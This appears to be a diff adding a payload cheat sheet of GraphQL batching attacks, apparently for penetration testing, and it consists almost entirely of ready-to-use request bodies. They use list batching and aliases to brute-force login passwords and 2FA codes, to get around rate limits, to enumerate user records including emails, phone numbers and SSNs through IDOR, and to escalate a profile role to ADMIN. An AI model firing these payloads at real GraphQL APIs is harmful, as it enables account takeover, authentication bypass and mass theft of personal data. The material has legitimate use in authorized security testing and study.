@@ -1,0 +1,46 @@
+# GraphQL batching attacks — JSON list batching + alias IDOR (PAT, PortSwigger, Wallarm)
+# Bypass rate limits, 2FA brute force, per-request auth. Authorized testing only.
+
+# --- JSON list batching template (replace QUERY) ---
+[
+  {"query":"query { user(id: \"1\") { id email } }"},
+  {"query":"query { user(id: \"2\") { id email } }"},
+  {"query":"query { user(id: \"3\") { id email } }"}
+]
+
+# --- Password brute-force amplification (PortSwigger lab pattern) ---
+[
+  {"query":"mutation { login(username:\"victim\", password:\"1111\") { token } }"},
+  {"query":"mutation { login(username:\"victim\", password:\"2222\") { token } }"},
+  {"query":"mutation { login(username:\"victim\", password:\"3333\") { token } }"},
+  {"query":"mutation { login(username:\"victim\", password:\"4444\") { token } }"}
+]
+
+# --- Alias-based login brute force (single operation) ---
+{"query":"mutation { a: login(pass: 1111, username: \"bob\") b: login(pass: 2222, username: \"bob\") c: login(pass: 3333, username: \"bob\") d: login(pass: 4444, username: \"bob\") }"}
+
+# --- Query name based batching ---
+{"query":"query { q1: Query { me { id } } q2: Query { users { id email } } }"}
+
+# --- IDOR enumeration via aliases (100 users in one request) ---
+{"query":"query { u1: user(id:1) { email phone ssn } u2: user(id:2) { email phone ssn } u3: user(id:3) { email phone ssn } u4: user(id:4) { email phone ssn } u5: user(id:5) { email phone ssn } }"}
+
+# --- Post IDOR batch ---
+{"query":"query { p1: post(id:1) { title body author { email } } p2: post(id:2) { title body author { email } } p3: post(id:3) { title body author { email } } }"}
+
+# --- Order/invoice enumeration ---
+{"query":"query { o1: order(id:\"ORD-001\") { total items { sku } } o2: order(id:\"ORD-002\") { total items { sku } } }"}
+
+# --- Mixed query + mutation batch (auth bypass testing) ---
+[
+  {"query":"query { me { role } }"},
+  {"query":"mutation { updateProfile(role:ADMIN) { success } }"},
+  {"query":"query { me { role } }"}
+]
+
+# --- 2FA bypass batch (try multiple codes) ---
+[
+  {"query":"mutation { verify2FA(code:\"000000\") { token } }"},
+  {"query":"mutation { verify2FA(code:\"111111\") { token } }"},
+  {"query":"mutation { verify2FA(code:\"123456\") { token } }"}
+]
